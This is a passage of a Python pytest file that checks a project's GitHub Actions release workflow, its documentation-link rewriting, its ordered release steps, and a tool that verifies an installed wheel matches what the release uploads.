        (tmp_path / "dist").mkdir()
        (tmp_path / "dist" / "ddd_tool-0.12.0-py3-none-any.whl").write_bytes(b"")
        build = job(PUBLISH_WORKFLOW, "build")
        ran = run_step(
            step(build, "Check the installed wheel answers as the release"),
            tmp_path,
            GITHUB_EVENT_NAME=event_name,
            GITHUB_REF=ref,
            GITHUB_REF_NAME=ref.split("/", 2)[2],
            RUNNER_TEMP="runner-temp",
        )
        assert ran.returncode == 0, ran.stdout + ran.stderr
        wheel = "dist/ddd_tool-0.12.0-py3-none-any.whl"
        assert ran.stdout == f"{[wheel, checked, 'runner-temp/installed/bin/ddd']}\n"

    POINTING = "Point the description's links into the documentation at this release"
    """The step of Publish's build that has the README, the release's page on the index, link
    the documentation of the release rather than master's (20:M7)."""

    def test_the_description_is_pointed_at_the_release_before_the_build_reads_it(self) -> None:
        """20:M7. A release's page on the index is its README, whose links into the
        documentation followed master: 0.11.0's page sent its reader to pages of what it had not
        got. The build points them at the release before ``python -m build`` reads the README,
        and the installed check, which holds the wheel's description to the release, runs after
        it."""
        build = job(PUBLISH_WORKFLOW, "build")
        order = [
            build.index(f"- name: {self.POINTING}"),
            build.index("run: python -m build"),
            build.index("- name: Check the installed wheel answers as the release"),
        ]
        assert order == sorted(order), "the README is pointed after the build has read it"

    def test_the_step_points_every_link_into_the_documentation_at_the_release(
        self, tmp_path: Path
    ) -> None:
        """Run on this checkout's own README, as the repository writes it, and its
        ``pyproject.toml``: every link into the address ``pyproject.toml`` names as the
        documentation - into ``latest/``, and to the root - names ``v<version>/`` instead, and
        nothing else of the README changes; and ``pyproject.toml``'s ``Documentation`` url,
        which the index shows beside the description, names it too, and nothing else of that
        file changes."""
        source = as_in_the_repository(README)
        manifest = (ROOT / "pyproject.toml").read_bytes().decode("utf-8")
        (tmp_path / "README.md").write_bytes(source.encode("utf-8"))
        (tmp_path / "pyproject.toml").write_bytes(manifest.encode("utf-8"))
        ran = run_step(step(job(PUBLISH_WORKFLOW, "build"), self.POINTING), tmp_path)
        assert ran.returncode == 0, ran.stdout + ran.stderr
        pointed = (tmp_path / "README.md").read_bytes().decode("utf-8")
        release = f"{DOCS_URL}v{__version__}/"
        links = re.findall(LINKED, pointed)
        assert links, "the README links nothing of the documentation, so this weighs nothing"
        assert [link for link in links if not link.startswith(release)] == []
        assert len(links) == source.count(DOCS_URL)
        assert pointed.replace(release, "<the site>") == source.replace(
            f"{DOCS_URL}latest/", "<the site>"
        ).replace(f"<{DOCS_URL}>", "<<the site>>")
        named = (tmp_path / "pyproject.toml").read_bytes().decode("utf-8")
        assert tomllib.loads(named)["project"]["urls"]["Documentation"] == release

        def others(text: str) -> list[str]:
            return [line for line in text.splitlines() if not line.startswith("Documentation = ")]

        assert others(named) == others(manifest)
        assert ran.stdout == (
            f"README.md links {release} {len(links)} times, in place of latest/ and the root, and "
            "pyproject.toml names it as its Documentation url\n"
        )

    def test_the_readme_and_the_page_say_which_version_the_links_follow(self) -> None:
        """The README is read in two places, the repository and a release's page on the index,
        and says what its links follow in each; the page says what the build does to them, what
        the installed check refuses, and when the directory they lead to is written."""
        readme = flattened(README)
        page = flattened(PAGES["docs/developer_documentation.rst"])
        claims = {
            "README, its rule": "The links below point into the version this README describes",
            "README, in its tree": "in the repository, `latest/`, so that they describe the tree "
            "this README sits in",
            "README, for a release": "in the description PyPI shows for a release, that release's "
            "own directory, which its build points them at",
            "the page, the heading": "A release's page on the index links its own documentation.",
            "the page, why": "The README is the description PyPI shows for a release, and in the "
            "tree its links into the documentation point into ``latest/``, which follows "
            "``master``",
            "the page, what the build does": "So the build points each of them at "
            "``v<version>/``, of the version ``pyproject.toml`` states, the link to the root of "
            "the site among them, and with them ``pyproject.toml``'s ``Documentation`` url, which "
            "the index shows beside the description, in its checkout and before ``python -m "
            "build`` reads the two; nothing of that is committed.",
            "the page, what the check refuses": "The installed check then refuses a wheel whose "
            "``Documentation`` url is not that directory, whose description links the "
            "documentation anywhere else or nothing of it, or that names no ``Documentation`` url "
            "at all.",
            "the page, the gap": "the release's page links pages that are not served yet",
        }
        missing = [
            what
            for what, claim in claims.items()
            if claim not in (readme if what.startswith("README") else page)
        ]
        assert not missing, f"no longer said: {missing}"
        assert "which is what the links below point into" not in readme
        said = comments_of(job(PUBLISH_WORKFLOW, "build"))
        assert (
            "every link into the documentation's address - its root included - and "
            "pyproject.toml's Documentation url, which the index shows beside the description, are "
            "pointed at v<version>/"
        ) in said
        assert "The site's root is the url's, less any version directory it already names." in said
        assert (
            "and where its Documentation url and its description send their reader into the "
            "documentation"
        ) in said

    def test_publish_keeps_what_its_documentation_waits_on(self) -> None:
        """A release's documentation waits on Publish's run (20:I3): on the workflow of that
        name, on a run a published release started, and on its success. So Publish keeps its
        name and its trigger; no job of it, nor of the ci.yml it runs, passes while failing; on
        a release every job of it runs but the dry run's upload, since a job skipped counts as
        passed; and each upload waits on the build, where the tag is checked before anything is
        handed on."""
        named = re.search(r"^name: (.+)$", PUBLISH_WORKFLOW, re.M)
        assert named is not None and named.group(1) == "Publish"
        assert "types: [published]" in events(PUBLISH_WORKFLOW)["release"]
        for workflow in (PUBLISH_WORKFLOW, CI_WORKFLOW):
            assert "continue-on-error" not in uncommented(workflow)
        jobs = PUBLISH_WORKFLOW.split("\njobs:\n", 1)[1]
        names = re.findall(r"^  ([a-z][\w-]*):\n", jobs, re.M)
        release = publish_run("release", "refs/tags/v0.12.0")
        ran = {name: job_runs(PUBLISH_WORKFLOW, name, release) for name in names}
        assert ran == {name: name != "publish-testpypi" for name in names}
        uploads = [
            name
            for name in names
            if re.search(r"gh-action-pypi-publish|gh release upload", job(PUBLISH_WORKFLOW, name))
        ]
        assert uploads == ["extension", "publish-testpypi", "publish-pypi"]
        for name in uploads:
            assert setting(job(PUBLISH_WORKFLOW, name), "needs", 4) == "build", name

    @pytest.mark.parametrize(
        ("event_name", "ref", "target", "uploads"),
        [
            ("release", "refs/tags/v0.12.0", "", ["extension", "publish-pypi"]),
            ("workflow_dispatch", "refs/heads/master", "testpypi", ["publish-testpypi"]),
            ("workflow_dispatch", "refs/tags/v0.12.0", "pypi", ["publish-pypi"]),
            ("workflow_dispatch", "refs/heads/master", "pypi", []),
        ],
        ids=[*PUBLISH_RUNS, "a dispatch to pypi from a branch"],
    )
    def test_each_run_of_publish_uploads_where_its_conditions_say(
        self, event_name: str, ref: str, target: str, uploads: list[str]
    ) -> None:
        """Read over each run Publish makes as the runner reads them: a release attaches the
        .vsix and uploads to pypi.org, the dry run uploads to TestPyPI, a dispatch from a
        release's tag to pypi.org, and one to pypi.org from a branch nowhere."""
        context = publish_run(event_name, ref, target)
        names = ("extension", "publish-testpypi", "publish-pypi")
        assert [name for name in names if job_runs(PUBLISH_WORKFLOW, name, context)] == uploads

    def test_the_page_says_what_publish_runs_before_it_uploads(self) -> None:
        """Where the maintainer reads it: what Publish runs and how, what the run it calls is
        given and does otherwise, and how the wheel is installed and held to itself."""
        said = flattened(PAGES["docs/developer_documentation.rst"])
        claims = {
            "what runs": "``publish.yml`` runs this whole workflow again before it builds a "
            "release, on the release's own commit",
            "how": "It calls ``ci.yml`` as a reusable workflow (``workflow_call``) rather than "
            "keeping a copy of its jobs, so the two cannot drift",
            "what the build waits for": "builds nothing for upload until every job of it has "
            "passed",
            "what it ran before": "It used to run the python suite again on one of the six "
            "cells, and none of the page's own gates",
            "what a called run is given": "A run called so is given Publish's ``github`` context",
            "its inputs": "only the inputs Publish passes, which are none, so the journeys run "
            "once each and nothing is skipped as in a hunt",
            "its group": "the concurrency group is Publish's run's own",
            "its wheel": "the ``gui`` job builds no wheel, Publish building, installing and "
            "checking the one it ships",
            "its development builds": "which run on a push or a pull request alone, never run "
            "for a release",
            "its permission": "The call allows ``id-token: write``, which ``dev-publish`` asks for",
            "when GitHub checks it": "GitHub checks what each asks for as the run starts, "
            "whatever its ``if:``. ``dev-publish`` cannot run in Publish's run",
            "a release's wait": "A release waits on every job of ``ci.yml``, then, its windows "
            "cells and its journeys included, and its documentation waits on the release.",
            "a failed gate's re-run": "*Re-run failed jobs* on Publish's run runs that job again, "
            "on the release's commit, and with it every job that depends on it",
            "what keeps": "The jobs that passed keep their results.",
            "the heading": "Nothing is uploaded until the wheel has been installed and run.",
            "the gates first": "Every job of ``ci.yml`` has passed on the release's commit first",
            "the installation": "The build then installs the wheel it built into a fresh "
            "virtual environment, its dependencies from the index",
            "what it is held to": "holding what it answers to the wheel itself",
            "the version": "``ddd --version`` the version the run publishes - the tag's on a "
            "release",
            "the directories": "``ddd templates-dir`` a directory holding exactly the templates "
            "the wheel carries; ``ddd cmake-dir`` one whose ``Ddd.cmake`` is the wheel's",
            "the page": "``ddd gui``, started, the wheel's ``index.html`` at the address it prints",
            "only then": "Only then is the wheel handed to the jobs that upload it.",
            "what it was": "used to be a listing of the wheel for ``index.html``, and it was "
            "never installed",
        }
        missing = [what for what, claim in claims.items() if claim not in said]
        assert not missing, f"the developer page no longer says {missing}"


class TestTheStepsOfARelease:
    """20:M15. The developer page gave an account of the release machinery and no steps: no
    order for merging, waiting, bumping, the notes, the tag and the checks after it, and no word
    on meeting a failed job. An ordered list on the page gives them now, each held here to the
    workflow, the walk or the script it names, and to what it says."""

    LEADS: ClassVar[list[str]] = [
        "Merge",
        "Wait for ci",
        "Bump the version",
        "Write the notes",
        "Create the release",
        "Publish runs",
        "Documentation publishes",
        "Check",
        "When a job fails",
        "Leave master's version",
    ]
    """Each step's bold lead, in the order the steps are taken."""

    @staticmethod
    def steps() -> list[str]:
        """The items of the page's ordered list of the steps of a release, each flattened."""
        page = PAGES["docs/developer_documentation.rst"]
        heading = "\nThe steps of a release\n~~~~~~~~~~~~~~~~~~~~~~\n"
        assert heading in page, "the developer page lists no steps of a release"
        section = page.split(heading, 1)[1].split("\nDelivering the editor extension\n", 1)[0]
        return [flattened(item).strip() for item in re.split(r"^#\. ", section, flags=re.M)[1:]]

    def taken(self, lead: str) -> str:
        """The step whose bold lead is ``lead``."""
        found = [step for step in self.steps() if step.startswith(f"**{lead}**")]
        assert len(found) == 1, f"the page has {len(found)} steps led by {lead!r}"
        return found[0]

    def said(self, lead: str, claims: dict[str, str]) -> None:
        """Each of ``claims`` is said by the step led by ``lead``."""
        step = self.taken(lead)
        missing = [what for what, claim in claims.items() if claim not in step]
        assert not missing, f"the step {lead!r} no longer says {missing}"

    def test_they_are_listed_in_the_order_they_are_taken(self) -> None:
        leads = [re.match(r"\*\*(.+?)\*\*", step) for step in self.steps()]
        assert [lead.group(1) if lead else None for lead in leads] == self.LEADS

    def test_the_release_is_merged_and_waited_for_before_anything_is_bumped(self) -> None:
        self.said(
            "Merge",
            {
                "what": "**Merge** into ``master`` everything the release is to carry, each "
                "change through its pull request.",
            },
        )
        self.said(
            "Wait for ci",
            {
                "what": "**Wait for ci** on ``master``'s newest commit, every job of ``ci.yml`` "
                "passing.",
                "why": "Publish runs all of them but the development builds again on the "
                "release's commit and uploads nothing until they pass, so what would fail there "
                "fails here first, where it costs a pull request rather than a release to delete "
                "and create again.",
            },
        )

    def test_the_version_is_bumped_in_the_files_the_walk_counts(self) -> None:
        """The step names the walk above it by its number: a file added to the walk without the
        step changing leaves the step counting the old number, and this fails."""
        walk = re.search(
            r"\*\*The version is spelled in (\w+) files",
            flattened(PAGES["docs/developer_documentation.rst"]),
        )
        assert walk is not None, "the page no longer counts the files that spell the version"
        self.said(
            "Bump the version",
            {
                "where": f"in a commit of its own, on a branch, in the {walk.group(1)} files "
                "listed above, and in no other commit",
                "what it makes true": "``master`` states the release's version from the moment "
                "that commit lands.",
            },
        )

    def test_the_notes_are_the_unreleased_section_under_the_version(self) -> None:
        """The topmost section of the changelog is what the tests hold to the tree, whatever its
        name (``UNRELEASED``), so the rename the step asks for moves nothing else."""
        self.said(
            "Write the notes",
            {
                "the rename": "``## Unreleased`` in ``CHANGELOG.md`` becomes ``## <version>``, "
                "and that section is the release's notes.",
                "the merge": "Merge the commit through its pull request, and wait for ci on "
                "``master`` once more: the commit it runs on is the one the tag names.",
            },
        )

    def test_the_tag_is_the_one_publish_checks_for(self) -> None:
        self.said(
            "Create the release",
            {
                "where": "**Create the release** on GitHub, on that commit, with a new tag "
                "``v<version>``",
                "the tag": "``v`` and the version ``pyproject.toml`` states, exactly, or Publish "
                "refuses it",
                "the notes": "and the notes of ``## <version>``, and publish it.",
            },
        )
        checked = step(job(PUBLISH_WORKFLOW, "build"), "Check tag matches package version")
        assert '"$GITHUB_REF_NAME" != "v$version"' in checked
        assert "types: [published]" in events(PUBLISH_WORKFLOW)["release"]

    def test_publish_s_jobs_are_named_in_the_order_a_release_runs_them(self) -> None:
        """The step names the jobs a release runs, in the order their ``needs`` run them: the
        gates, the build, then the two that wait for the build. A job renamed, added to a
        release or moved in that order fails here until the step says so."""
        jobs = PUBLISH_WORKFLOW.split("\njobs:\n", 1)[1]
        names = re.findall(r"^  ([a-z][\w-]*):\n", jobs, re.M)
        release = publish_run("release", "refs/tags/v0.12.0")

        def depth(name: str) -> int:
            needed = re.findall(r"[\w-]+", setting(job(PUBLISH_WORKFLOW, name), "needs", 4) or "")
            return 1 + max((depth(other) for other in needed), default=0)

        running = [name for name in names if job_runs(PUBLISH_WORKFLOW, name, release)]
        order = sorted(running, key=lambda name: (depth(name), names.index(name)))
        publishing = self.taken("Publish runs")
        named = [found for found in re.findall(r"``([\w-]+)``", publishing) if found in names]
        assert list(dict.fromkeys(named)) == order
        self.said(
            "Publish runs",
            {
                "the gates": "on the tag's commit, in this order: ``ci``, every job of ``ci.yml`` "
                "but the development builds",
                "the build": "then ``build``, which compiles the pages, points the description's "
                "links into the documentation, and the ``Documentation`` url, at ``v<version>/``, "
                "builds the wheel and the sdist, "
                "checks that the wheel carries the pages and that the tag is the version, runs "
                "``twine check``, and installs the wheel into a fresh environment and checks the "
                "installation",
                "the uploads": "each waiting for ``build``, ``extension``, which attaches "
                "``ddd-<version>.vsix`` to the release, and ``publish-pypi``, which uploads the "
                "wheel and the sdist to pypi.org.",
                "a reviewer's approval": "Where the ``pypi`` environment has a required "
                "reviewer, as the protection above describes, ``publish-pypi`` waits for that "
                "reviewer's approval before it uploads, and Publish's run, and so the "
                "documentation, waits with it.",
            },
        )
        uploading = uncommented(job(PUBLISH_WORKFLOW, "publish-pypi"))
        assert re.search(r"^    environment:\n      name: pypi$", uploading, re.M), uploading

    def test_documentation_waits_for_the_whole_of_publish_as_the_step_says(self) -> None:
        self.said(
            "Documentation publishes",
            {
                "when": "once Publish's run has succeeded - every job of it, the ``.vsix``'s "
                "included",
                "what": "a run of ``docs.yml`` builds the commit the tag names, publishes it under "
                "``v<version>``, lists it in the menu of every page, and reads it back from the "
                "site.",
                "the root": "The root of the site lands on it if it is the newest release, which a "
                "release candidate never is.",
            },
        )
        assert "Publish" in events(DOCS_WORKFLOW)["workflow_run"]
        assert job_runs(DOCS_WORKFLOW, "deploy", completed())
        assert not job_runs(DOCS_WORKFLOW, "deploy", completed(conclusion="failure"))

    def test_what_is_checked_after_is_what_the_release_published(self) -> None:
        self.said(
            "Check",
            {
                "what": "**Check** what was published: the version on pypi.org, whose page links "
                "``v<version>/`` of the documentation; ``ddd-<version>.vsix`` on the release; "
                "``v<version>`` in the menu of the site; and, in a fresh environment, ``pip "
                "install ddd-tool==<version>`` installing a ``ddd`` whose ``--version`` answers "
                "``ddd <version>``.",
            },
        )

    def test_a_failure_is_met_by_the_routes_the_workflows_offer(self) -> None:
        """What the step has a maintainer do is what the workflows allow: a re-run of what
        failed, a release made again while no index holds it, no upload passing twice, and a
        release's documentation published by hand from a dispatch naming its tag."""
        self.said(
            "When a job fails",
            {
                "what decides": "what to do depends on whether anything has reached pypi.org",
                "before the upload": "Until ``publish-pypi`` has uploaded, nothing has - whether "
                "a gate failed, the build, one of its checks, or the upload itself, refused before "
                "it began, as for ``invalid-publisher`` until the registration is corrected",
                "a failure that comes and goes": "*Re-run failed jobs* on Publish's run, for a "
                "failure that comes and goes or one corrected outside the tree",
                "one in the commit": "for one in the tagged commit, delete the release and its "
                "tag, fix ``master``, and create the release again, its version unchanged, since "
                "no index holds it",
                "a refused tag": "A tag Publish refused is remade so too.",
                "after the upload": "Once a file is on pypi.org no run of the upload passes "
                "again, an index taking a file name once",
                "what a re-run of what failed serves": "*Re-run failed jobs* runs again only what "
                "failed and what waits for it, so it serves a failed ``extension`` beside an "
                "upload that passed",
                "what a re-run of everything cannot": "and *Re-run all jobs* cannot pass.",
                "by hand": "A release no re-run can finish has its documentation published by "
                "hand: *Documentation*, run from ``master`` with the release's tag as ``tag``.",
                "documentation's own failure": "A run of *Documentation* that fails on its own "
                "is re-run as it is.",
                "a file no re-run uploads": "A file no re-run can upload - the wheel on pypi.org "
                "and the sdist refused, say - waits for the next version: every route here uploads "
                "the whole of ``dist``, and an index takes a file that landed once.",
            },
        )
        uploading = uncommented(job(PUBLISH_WORKFLOW, "publish-pypi"))
        assert "skip-existing" not in uploading
        assert "name: dist\n          path: dist/\n" in uploading, (
            "publish-pypi uploads another set"
        )
        assert "packages-dir" not in uploading, "publish-pypi uploads part of dist"
        assert "tag:" in events(DOCS_WORKFLOW)["workflow_dispatch"]

    def test_master_keeps_the_release_s_version_after_it(self) -> None:
        self.said(
            "Leave master's version",
            {
                "what": "**Leave master's version** as the release's: nothing is bumped after a "
                "release.",
                "until when": "``master`` states it until the next release commit",
                "its builds": "its development builds number themselves after it: ``<next "
                "patch>.dev<run>`` after a release, and after a release candidate the next "
                "candidate's, ``0.12.0rc2.dev<run>`` after ``0.12.0rc1``.",
            },
        )
        assert dev_version.next_development("0.12.0", 57) == "0.12.1.dev57"
        assert dev_version.next_development("0.12.0rc1", 3) == "0.12.0rc2.dev3"


LAUNCH = """\
import sys
from pathlib import Path

sys.path.insert(0, sys.argv.pop(1))
import ddd.gui.server

pages = Path(sys.argv.pop(1))
ddd.gui.server.static_directory = lambda: pages
from ddd.cli import main

raise SystemExit(main())
"""
"""This checkout's ``ddd``, run as a program the way an installation runs it, serving the pages of
a directory the test names: the pages are compiled by npm, which no test here runs. It is
imported from the sources the suite tests, named first, rather than from whatever ``ddd`` the
interpreter has installed, which may be another tree's: an editable install of another
checkout, or an older release."""

INDEX = b'<!doctype html>\n<title>DDD</title>\n<div id="root"></div>\n'
"""A page for ``ddd gui`` to serve, standing for the compiled one."""

DESCRIPTION = (
    f"The documentation of this release is at <{DOCS_URL}v{__version__}/>, and its plugins "
    f"[there]({DOCS_URL}v{__version__}/plugins.html).\n"
)
"""A description as Publish's build leaves the README: each link into the documentation points
at the directory of the release."""

LINKED = re.escape(DOCS_URL) + r"[^\s)>\]\"'`]*"
"""A link into the documentation, as markdown writes one: up to a space, or the bracket, quote or
backtick that closes it."""


def as_in_the_repository(readme: str) -> str:
    """The README with its links into the documentation as the repository writes them, into
    ``latest/``: this checkout's own text in a checkout, and in a release's sdist the README
    Publish's build pointed at the release's directory before it built the archive, taken back.
    The suite runs from either, so what a test feeds the pointing step is this."""
    return readme.replace(f"{DOCS_URL}v{__version__}/", f"{DOCS_URL}latest/")


BROKEN = [sys.executable, "-c", "raise SystemExit('no ddd here')"]
"""An installation whose ``ddd`` runs nothing: it says so, and exits 1."""

SIGNING_IN = """\
import http.server
import sys

PAGE = open(sys.argv[1], "rb").read()


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/open"):
            self.send_response(302)
            self.send_header("Location", "/")
            self.send_header("Set-Cookie", "signed=in; Path=/")
            self.end_headers()
        elif "signed=in" in self.headers.get("Cookie", ""):
            self.send_response(200)
            self.send_header("Content-Length", str(len(PAGE)))
            self.end_headers()
            self.wfile.write(PAGE)
        else:
            self.send_error(401)

    def log_message(self, *arguments):
        pass


server = http.server.HTTPServer(("127.0.0.1", 0), Handler)
print(f"ddd gui (preview) serving http://127.0.0.1:{server.server_port}/open?token=t", flush=True)
server.serve_forever()
"""
"""A ``ddd gui`` that signs a reader in the way it once did: the address it prints redirects to
its page with a cookie, and the page answers only with that cookie."""


class TestTheReleaseInstallsWhatItUploads:
    """20:M4. Publish's one look at the wheel it uploads was a listing of its names for
    ``index.html``: the wheel was never installed. ``tools/installed_wheel.py`` holds an
    installation to the wheel it came from, and Publish's build runs it on the wheel it built,
    installed into a fresh environment, before anything is uploaded.

    The checks run here against this checkout's own ``ddd``, run as a program, and a wheel of
    what this checkout would put in one: its version, the example templates, the cmake module,
    and a page standing for the compiled ones, which only npm makes.
    """

    @staticmethod
    def wheel(
        tmp_path: Path,
        *,
        templates: dict[str, bytes] | None = None,
        module: bytes | None = None,
        page: bytes | None = INDEX,
        description: str = DESCRIPTION,
        documentation: str | None = f"{DOCS_URL}v{__version__}/",
    ) -> Path:
        """A wheel of what the checks read, where hatchling puts it: its metadata - its version,
        its ``Documentation`` url unless ``documentation`` is None, and its description - the
        example templates under ``ddd/templates/``, ``ddd/cmake/Ddd.cmake`` and the page; by
        default this checkout's. An empty ``templates`` or ``module`` is left out, as
        ``page=None`` is."""
        if templates is None:
            source = ROOT / "examples" / "templates"
            templates = {path.name: path.read_bytes() for path in source.iterdir()}
        if module is None:
            module = (ROOT / "cmake" / "Ddd.cmake").read_bytes()
        urls = "" if documentation is None else f"Project-URL: Documentation, {documentation}\n"
        wheel = tmp_path / f"ddd_tool-{__version__}-py3-none-any.whl"
        with zipfile.ZipFile(wheel, "w") as archive:
            archive.writestr(
                f"ddd_tool-{__version__}.dist-info/METADATA",
                f"Metadata-Version: 2.4\nName: ddd-tool\nVersion: {__version__}\n{urls}"
                f"Description-Content-Type: text/markdown\n\n{description}",
            )
            for name, data in templates.items():
                archive.writestr(f"ddd/templates/{name}", data)
            if module:
                archive.writestr("ddd/cmake/Ddd.cmake", module)
            if page is not None:
                archive.writestr("ddd/gui/static/index.html", page)
        return wheel

    @staticmethod
    def installed(tmp_path: Path, page: bytes | None = INDEX) -> list[str]:
        """This checkout's ``ddd``, serving ``page`` as its compiled pages, or nothing at all."""
        pages = tmp_path / "pages"
        pages.mkdir()
        if page is not None:
            (pages / "index.html").write_bytes(page)
        return [sys.executable, "-c", LAUNCH, str(ROOT / "src"), str(pages)]

    def test_an_installation_answering_as_the_release_passes(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        """Its version, its templates, its module and its page, all as the wheel has them."""
        wheel = self.wheel(tmp_path)
        assert installed_wheel.main([str(wheel), __version__, *self.installed(tmp_path)]) == 0
        assert capsys.readouterr().out == f"{wheel.name}, installed, answers as ddd {__version__}\n"

    def test_a_release_the_installation_does_not_name_is_refused(self, tmp_path: Path) -> None:
        """The version a run publishes is stated three times over in what it installs: in the
        wheel's metadata, which pip installs by; in what ``ddd --version`` prints, which the
        banner of every generated file carries; and as the module's ``DDD_MODULE_VERSION``,
        which the module compares with that, refusing a ``ddd`` of any other. The description
        the index shows names it a fourth time, in its links into the documentation (20:M7)."""
        found = installed_wheel.problems(self.wheel(tmp_path), "9.9.9", self.installed(tmp_path))
        assert found == [
            f"the wheel states version {__version__}, and the release is 9.9.9",
            "the wheel's ddd/cmake/Ddd.cmake does not state DDD_MODULE_VERSION 9.9.9, so the "
            "module refuses the ddd it is installed with",
            "the wheel's Documentation url, which the index shows beside the description, is "
            f"{DOCS_URL}v{__version__}/, and not the documentation of v9.9.9",
            "the wheel's description, the release's page on the index, links the documentation "
            f"outside v9.9.9/ 2 times, the first at {DOCS_URL}v{__version__}/",
            f"ddd --version answers 'ddd {__version__}', and the release is 9.9.9",
        ]

    def test_an_installation_that_is_not_the_wheel_is_refused(self, tmp_path: Path) -> None:
        """What the installation answers is held to what the wheel carries, file for file: the
        templates its directory holds, the module, and the page ``ddd gui`` serves."""
        source = ROOT / "examples" / "templates"
        templates = {path.name: path.read_bytes() for path in source.iterdir()}
        templates["extra.c.jinja2"] = b"/* the wheel carries what the installation lacks */\n"
        module = (ROOT / "cmake" / "Ddd.cmake").read_bytes() + b"# another module\n"
        wheel = self.wheel(tmp_path, templates=templates, module=module, page=b"<p>another\n")
        directory, cmake = example_template_directory(), cmake_module_directory()
        assert directory is not None and cmake is not None
        assert installed_wheel.problems(wheel, __version__, self.installed(tmp_path)) == [
            f"ddd templates-dir answers {directory.as_posix()!r}, which does not hold exactly "
            f"the {len(templates)} templates the wheel carries",
            f"ddd cmake-dir answers {cmake.as_posix()!r}, whose Ddd.cmake is not the wheel's",
            "the page ddd gui serves is not the ddd/gui/static/index.html the wheel carries",
        ]

    def test_a_gui_with_no_page_to_serve_is_refused_saying_why(self, tmp_path: Path) -> None:
        """``ddd gui`` refuses to start without its pages, as an installation of a wheel built
        before they were compiled would: the step says what it said."""
        found = installed_wheel.problems(
            self.wheel(tmp_path), __version__, self.installed(tmp_path, page=None)
        )
        assert len(found) == 1, found
        assert found[0].startswith(f"ddd gui exits {EXIT_USAGE} without printing its address,")
        assert "has no compiled pages for ddd gui" in found[0]

    def test_a_gui_printing_no_address_is_waited_for_no_longer_than_the_limit(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A server that hangs before it listens holds the step for the limit, and not for the
        six hours a job may run."""
        monkeypatch.setattr(installed_wheel, "TIMEOUT", 2.0)
        silent = [sys.executable, "-c", "import sys, time\nif 'gui' in sys.argv: time.sleep(60)"]
        found = installed_wheel.problems(self.wheel(tmp_path), __version__, silent)
        assert found[-1] == "ddd gui printed no address within 2 seconds, saying ''"

    def test_the_page_is_asked_for_as_a_browser_asks_for_it(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A browser opening the printed address follows a redirect with the cookie it was
        given, and reaches the loopback directly whatever proxy the environment names: a
        server signing a reader in that way serves the page all the same."""
        monkeypatch.setenv("http_proxy", "http://127.0.0.1:9")
        monkeypatch.delenv("no_proxy", raising=False)
        monkeypatch.delenv("NO_PROXY", raising=False)
        page = tmp_path / "index.html"
        page.write_bytes(INDEX)
        signing_in = [sys.executable, "-c", SIGNING_IN, str(page)]
        assert installed_wheel.served(signing_in, tmp_path, INDEX) == []

    def test_an_installation_that_does_not_run_is_refused_saying_why(self, tmp_path: Path) -> None:
        assert installed_wheel.problems(self.wheel(tmp_path), __version__, BROKEN) == [
            "ddd --version exits 1, saying 'no ddd here'",
            "ddd templates-dir exits 1, saying 'no ddd here'",
            "ddd cmake-dir exits 1, saying 'no ddd here'",
            "ddd gui exits 1 without printing its address, saying 'no ddd here'",
        ]

    def test_a_wheel_missing_what_is_checked_is_refused(self, tmp_path: Path) -> None:
        """An empty set of templates, held to an empty directory, would pass unseen."""
        wheel = self.wheel(tmp_path, templates={}, module=b"", page=None)
        assert installed_wheel.problems(wheel, __version__, BROKEN) == [
            "ddd --version exits 1, saying 'no ddd here'",
            "the wheel carries no templates under ddd/templates/",
            "the wheel carries no ddd/cmake/Ddd.cmake",
            "the wheel carries no ddd/gui/static/index.html, so ddd gui has nothing to serve",
        ]

    def test_each_problem_is_an_error_of_the_step_on_a_line_of_its_own(
        self, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        """The runner reads ``::error::`` at the start of a line as an annotation of the step,
        so a problem spanning lines would start one of its own with whatever it was given."""
        found = ["ddd --version answers 'x'", "it said\n::error::something else"]
        monkeypatch.setattr(installed_wheel, "problems", lambda *_: found)
        assert installed_wheel.main(["a.whl", "0.12.0", "ddd"]) == 1
        assert capsys.readouterr().out.splitlines() == [
            "::error::ddd --version answers 'x'",
            "::error::it said ::error::something else",
        ]

    def test_a_file_that_is_no_wheel_is_refused(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        wheel = tmp_path / "ddd_tool-0.12.0-py3-none-any.whl"
        wheel.write_bytes(b"not a zip")
        assert installed_wheel.main([str(wheel), "0.12.0", "ddd"]) == 1
        assert capsys.readouterr().out.startswith(f"::error::{wheel} cannot be read as a wheel: ")

    @pytest.mark.parametrize("arguments", [[], ["a.whl"], ["a.whl", "0.12.0"]])
    def test_anything_else_is_a_usage_error(
        self, arguments: list[str], capsys: pytest.CaptureFixture[str]
    ) -> None:
        assert installed_wheel.main(arguments) == 2
        assert "usage:" in capsys.readouterr().err

    def test_the_release_s_own_description_passes(self, tmp_path: Path) -> None:
        """20:M7, end to end: this checkout's README and ``pyproject.toml`` as Publish's build
        leaves them, the step that points them run on them, make a description and a
        ``Documentation`` url the check passes."""
        tree = tmp_path / "tree"
        tree.mkdir()
        (tree / "README.md").write_bytes(as_in_the_repository(README).encode("utf-8"))
        (tree / "pyproject.toml").write_bytes((ROOT / "pyproject.toml").read_bytes())
        pointing = TestWhatPublishRunsBeforeItUploads.POINTING
        ran = run_step(step(job(PUBLISH_WORKFLOW, "build"), pointing), tree)
        assert ran.returncode == 0, ran.stdout + ran.stderr
        pointed = (tree / "README.md").read_bytes().decode("utf-8")
        urls = tomllib.loads((tree / "pyproject.toml").read_text(encoding="utf-8"))["project"][
            "urls"
        ]
        wheel = self.wheel(tmp_path, description=pointed, documentation=urls["Documentation"])
        assert installed_wheel.misdirected(installed_wheel.carried(wheel), __version__) == []

    def test_a_wheel_naming_the_documentation_s_root_is_refused(self, tmp_path: Path) -> None:
        """20:M7. The index shows the ``Documentation`` url beside the description, and the
        site's root lands on whichever release is newest: a release's page that names it sends
        a reader of an older release to a newer one's documentation."""
        wheel = installed_wheel.carried(self.wheel(tmp_path, documentation=DOCS_URL))
        assert installed_wheel.misdirected(wheel, __version__) == [
            "the wheel's Documentation url, which the index shows beside the description, is "
            f"{DOCS_URL}, and not the documentation of v{__version__}"
        ]

    def test_a_description_linking_another_version_s_documentation_is_refused(
        self, tmp_path: Path
    ) -> None:
        """20:M7. The description is the page the index shows for the release, and its links into
